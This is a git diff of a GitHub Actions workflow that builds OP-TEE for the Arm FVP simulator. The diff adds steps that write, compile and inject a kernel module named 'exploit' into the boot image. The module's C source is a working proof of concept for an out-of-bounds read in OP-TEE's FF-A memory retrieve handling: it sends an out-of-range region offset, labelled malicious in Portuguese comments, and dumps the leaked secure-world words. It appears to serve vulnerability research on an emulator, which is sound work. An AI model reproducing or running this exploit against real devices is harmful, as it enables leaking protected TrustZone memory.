@@ -1,4 +1,4 @@
-name: Build OP-TEE FVP - Complete with Smart Save
+name: Build OP-TEE FVP + Exploit
 
 on:
   push:
@@ -8,71 +8,35 @@ on:
 jobs:
   build:
     runs-on: ubuntu-22.04
-    timeout-minutes: 240
 
     steps:
+      - name: Free up disk space
+        run: |
+          sudo rm -rf /usr/share/dotnet
+          sudo rm -rf /opt/ghc
+          sudo rm -rf "/usr/local/share/boost"
+          sudo rm -rf "$AGENT_TOOLSDIRECTORY"
+          sudo rm -rf /usr/local/lib/android
+          sudo apt-get clean
+          df -h
+
       - name: Install Dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y \
-            android-tools-adb \
-            android-tools-fastboot \
-            acpica-tools \
-            autoconf \
-            automake \
-            bc \
-            bison \
-            build-essential \
-            ccache \
-            cscope \
-            curl \
-            device-tree-compiler \
-            e2tools \
-            expect \
-            flex \
-            gdisk \
-            git \
-            libattr1-dev \
-            libcap-ng-dev \
-            libfdt-dev \
-            libftdi-dev \
-            libglib2.0-dev \
-            libgmp3-dev \
-            libgnutls28-dev \
-            libhidapi-dev \
-            libmpc-dev \
-            libncurses5-dev \
-            libpixman-1-dev \
-            libslirp-dev \
-            libssl-dev \
-            libtool \
-            libusb-1.0-0-dev \
-            make \
-            mtools \
-            netcat \
-            ninja-build \
-            python3-cryptography \
-            python3-pip \
-            python3-pyelftools \
-            python3-serial \
-            python3-tomli \
-            python-is-python3 \
-            rsync \
-            swig \
-            unzip \
-            uuid-dev \
-            wget \
-            xdg-utils \
-            xsltproc \
-            xterm \
-            xz-utils \
-            zlib1g-dev
+            android-tools-adb android-tools-fastboot acpica-tools autoconf automake \
+            bc bison build-essential ccache cscope curl device-tree-compiler e2tools \
+            expect flex gdisk git libattr1-dev libcap-ng-dev libfdt-dev libftdi-dev \
+            libglib2.0-dev libgmp3-dev libgnutls28-dev libhidapi-dev libmpc-dev \
+            libncurses5-dev libpixman-1-dev libslirp-dev libssl-dev libtool \
+            libusb-1.0-0-dev make mtools netcat ninja-build python3-cryptography \
+            python3-pip python3-pyelftools python3-serial python3-tomli python-is-python3 \
+            rsync swig unzip uuid-dev wget xdg-utils xsltproc xterm xz-utils zlib1g-dev
 
       - name: Install repo
         run: |
           mkdir -p "$HOME/bin"
-          curl -L https://storage.googleapis.com/git-repo-downloads/repo \
-            -o "$HOME/bin/repo"
+          curl -L https://storage.googleapis.com/git-repo-downloads/repo -o "$HOME/bin/repo"
           chmod +x "$HOME/bin/repo"
           echo "$HOME/bin" >> "$GITHUB_PATH"
 
@@ -88,104 +52,158 @@ jobs:
           cd optee-fvp/build
           make -f fvp.mk toolchains
 
-      - name: Build OP-TEE FVP (com FF-A SPMC_AT_EL=1)
+      - name: Build OP-TEE FVP (with SPMC_AT_EL=1)
         run: |
           cd optee-fvp/build
           make -f fvp.mk all SPMC_AT_EL=1 -j$(nproc)
 
-      - name: Collect new files only (skip 9 known binaries)
-        if: always()
+      - name: Prepare Linux Kernel for LKM
         run: |
-          mkdir -p artifacts/{new-files,debug-analysis,full-structure}
-          
-          SKIP_LIST="bl1.bin fip.bin boot-fat.uefi.img boot.scr rootfs.cpio.gz Image fvp-base-revc.dtb tee.elf tee.bin"
-          
-          echo "⏭️  ARQUIVOS QUE NÃO SERÃO SALVOS (já tem):" > artifacts/SKIPPED.txt
-          echo "$SKIP_LIST" | tr ' ' '\n' >> artifacts/SKIPPED.txt
-          cat artifacts/SKIPPED.txt
-          
-          echo "🔍 Copiando symbol maps..."
-          mkdir -p artifacts/debug-analysis/maps
-          find optee-fvp -name "*.map" -exec cp {} artifacts/debug-analysis/maps/ \; 2>/dev/null
-          
-          echo "🔗 Copiando linker scripts..."
-          mkdir -p artifacts/debug-analysis/linkers
-          find optee-fvp -name "*.ld" -exec cp {} artifacts/debug-analysis/linkers/ \; 2>/dev/null
-          
-          echo "🎯 Copiando object files (.o)..."
-          mkdir -p artifacts/debug-analysis/object-files
-          find optee-fvp/optee_os/out -name "*.o" -exec cp {} artifacts/debug-analysis/object-files/ \; 2>/dev/null
-          
-          echo "📂 Copiando full build structure..."
-          mkdir -p artifacts/full-structure/{optee_os,trusted-firmware-a,linux}
-          cp -r optee-fvp/optee_os/out artifacts/full-structure/optee_os/ 2>/dev/null
-          cp -r optee-fvp/trusted-firmware-a/build artifacts/full-structure/trusted-firmware-a/ 2>/dev/null
-          cp -r optee-fvp/linux/arch/arm64/boot artifacts/full-structure/linux/ 2>/dev/null
-          
-          cat > artifacts/BUILD_INFO.txt << 'BUILDEOF'
-          === Build #4 - Smart Save ===
-          Data: $(date -u)
-          Run: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
-          
-          === Arquivos NÃO salvos (use Build #3) ===
-          bl1.bin, fip.bin, boot-fat.uefi.img, boot.scr, rootfs.cpio.gz, Image, fvp-base-revc.dtb, tee.elf, tee.bin
-          
-          === Arquivos NOVOS (Build #4) ===
-          Symbol maps, linker scripts, object files, full build structure
-          
-          === Tamanho ===
-          BUILDEOF
-          du -sh artifacts/ >> artifacts/BUILD_INFO.txt
-          du -sh artifacts/* >> artifacts/BUILD_INFO.txt
+          cd optee-fvp/linux
+          make ARCH=arm64 CROSS_COMPILE=../toolchains/aarch64/bin/aarch64-linux-gnu- defconfig
+          make ARCH=arm64 CROSS_COMPILE=../toolchains/aarch64/bin/aarch64-linux-gnu- modules_prepare -j$(nproc)
 
-      - name: Upload debug analysis files
+      - name: Create Exploit LKM Source
+        run: |
+          mkdir -p optee-lkm
+          cat > optee-lkm/exploit.c << 'INNER_EOF'
+#include <linux/module.h>
+#include <linux/arm-smccc.h>
+#include <linux/io.h>
+#include <linux/slab.h>
+#include <linux/printk.h>
+
+struct __packed ffa_mem_transaction {
+    uint16_t sender_id;
+    uint8_t mem_reg_attr;
+    uint8_t flags;
+    uint32_t global_handle;
+    uint64_t tag;
+    uint32_t mem_access_count;
+    uint32_t mem_access_offs;
+};
+
+struct __packed ffa_mem_access {
+    uint16_t endpoint_id;
+    uint8_t perm;
+    uint8_t flags;
+    uint32_t region_offs;
+};
+
+#define FFA_MEM_RETRIEVE_REQ_SMC64 0xC4000066
+#define FFA_MEM_SHARE_SMC64 0xC4000065
+#define FFA_RXTX_MAP_SMC64 0xC4000006
+
+static int __init exploit_init(void) {
+    struct arm_smccc_res res;
+    void *tx_buf, *rx_buf;
+    struct ffa_mem_transaction *trans;
+    struct ffa_mem_access *mem_acc;
+
+    tx_buf = kmalloc(4096, GFP_KERNEL);
+    rx_buf = kmalloc(4096, GFP_KERNEL);
+    if (!tx_buf || !rx_buf) return -ENOMEM;
+
+    arm_smccc_smc(FFA_RXTX_MAP_SMC64, virt_to_phys(tx_buf), virt_to_phys(rx_buf), 1, 0, 0, 0, 0, &res);
+    pr_info("[oob_read] RXTX_MAP: res.a0=0x%lx\n", res.a0);
+
+    // FFA_MEM_SHARE
+    memset(tx_buf, 0, 4096);
+    trans = (struct ffa_mem_transaction *)tx_buf;
+    trans->sender_id = 0x1;
+    trans->mem_reg_attr = 0x2;
+    trans->mem_access_count = 1;
+    trans->mem_access_offs = sizeof(*trans);
+
+    mem_acc = (struct ffa_mem_access *)(tx_buf + trans->mem_access_offs);
+    mem_acc->endpoint_id = 0x8001;
+    mem_acc->perm = 0x2;
+    mem_acc->region_offs = sizeof(*trans) + sizeof(*mem_acc);
+
+    uint32_t *comp_total = (uint32_t *)(tx_buf + mem_acc->region_offs);
+    uint32_t *comp_count = (uint32_t *)(tx_buf + mem_acc->region_offs + 4);
+    *comp_total = 1;
+    *comp_count = 1;
+
+    uint64_t *cons_addr = (uint64_t *)(tx_buf + mem_acc->region_offs + 8);
+    uint32_t *cons_pages = (uint32_t *)(tx_buf + mem_acc->region_offs + 16);
+    *cons_addr = virt_to_phys(tx_buf);
+    *cons_pages = 1;
+
+    uint32_t frag_len = 56;
+    arm_smccc_smc(FFA_MEM_SHARE_SMC64, frag_len, frag_len, 0, 0, 0, 0, 0, &res);
+    pr_info("[oob_read] MEM_SHARE: res.a0=0x%lx handle=0x%lx\n", res.a0, res.a1);
+
+    if (res.a0 == 0x84000060) {
+        pr_err("[oob_read] MEM_SHARE falhou\n");
+        kfree(tx_buf); kfree(rx_buf); return -1;
+    }
+
+    uint64_t handle = ((uint64_t)res.a2 << 32) | res.a1;
+
+    // FFA_MEM_RETRIEVE_REQ malicioso
+    memset(tx_buf, 0, 4096);
+    trans = (struct ffa_mem_transaction *)tx_buf;
+    trans->sender_id = 0x1;
+    trans->mem_reg_attr = 0x2;
+    trans->global_handle = handle;
+    trans->mem_access_count = 1;
+    trans->mem_access_offs = sizeof(*trans);
+
+    mem_acc = (struct ffa_mem_access *)(tx_buf + trans->mem_access_offs);
+    mem_acc->endpoint_id = 0x8001;
+    mem_acc->perm = 0x2;
+    mem_acc->region_offs = 0x1000; // O OFFSET MALICIOSO
+
+    pr_info("[oob_read] Enviando SMC com region_offs=0x1000 (OOB)...\n");
+    arm_smccc_smc(FFA_MEM_RETRIEVE_REQ_SMC64, 128, 128, 0, 0, 0, 0, 0, &res);
+    pr_info("[oob_read] RETRIEVE_REQ: res.a0=0x%lx\n", res.a0);
+
+    if (res.a0 != 0x84000060) {
+        pr_info("[!!!] CRITICAL: OP-TEE aceitou o offset OOB!\n");
+        uint32_t *leak = (uint32_t *)rx_buf;
+        pr_info("[!!!] Dump dos dados vazados:\n");
+        for (int i = 0; i < 16; i++) {
+            pr_info("[oob_read] +%03d: 0x%08x\n", i * 4, leak[i]);
+        }
+    } else {
+        pr_info("[oob_read] OP-TEE rejeitou o offset (Safe).\n");
+    }
+
+    kfree(tx_buf);
+    kfree(rx_buf);
+    return 0;
+}
+
+static void __exit exploit_exit(void) { }
+module_init(exploit_init);
+module_exit(exploit_exit);
+MODULE_LICENSE("GPL");
+INNER_EOF
+
+          cat > optee-lkm/Makefile << 'INNER_EOF'
+obj-m += exploit.o
+KDIR ?= $(CURDIR)/../optee-fvp/linux
+all:
+    make -C $(KDIR) M=$(CURDIR) modules ARCH=arm64 CROSS_COMPILE=$(CURDIR)/../optee-fvp/toolchains/aarch64/bin/aarch64-linux-gnu-
+INNER_EOF
+
+      - name: Compile Exploit LKM
+        run: |
+          cd optee-lkm
+          make
+
+      - name: Inject Exploit into Rootfs Image
+        run: |
+          mcopy -i optee-fvp/out/boot-fat.uefi.img optee-lkm/exploit.ko ::/
+
+      - name: Upload build artifacts
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: build4-debug-analysis
-          path: artifacts/debug-analysis/
-          retention-days: 90
-
-      - name: Upload full build structure
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: build4-full-structure
-          path: artifacts/full-structure/
-          retention-days: 60
-
-      - name: Upload info
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: build4-info
+          name: optee-fvp-exploit
           path: |
-            artifacts/BUILD_INFO.txt
-            artifacts/SKIPPED.txt
-          retention-days: 90
-
-      - name: Compress new files
-        if: always()
-        run: |
-          tar czf build4-new-files-$(date +%Y%m%d).tar.gz artifacts/
-          ls -lh *.tar.gz
-
-      - name: Create Release
-        if: always()
-        uses: softprops/action-gh-release@v1
-        with:
-          tag_name: fvp-build-4
-          name: "Build #4 - New Analysis Files Only"
-          body: |
-            **Build #4 Smart Save Strategy**
-            
-            **❌ NOT SAVED (already have from Build #3):**
-            bl1.bin, fip.bin, boot-fat.uefi.img, boot.scr, rootfs.cpio.gz, Image, fvp-base-revc.dtb, tee.elf, tee.bin
-            
-            **✅ SAVED (NEW - Build #4):**
-            Symbol maps (*.map), Linker scripts (*.ld), Object files (.o), Full build structure
-            
-            **Space saved:** ~1.5GB
-          files: |
-            build4-new-files-*.tar.gz
-            artifacts/SKIPPED.txt
+            optee-fvp/trusted-firmware-a/build/fvp/release/bl1.bin
+            optee-fvp/trusted-firmware-a/build/fvp/release/fip.bin
+            optee-fvp/out/boot-fat.uefi.img
+          if-no-files-found: error
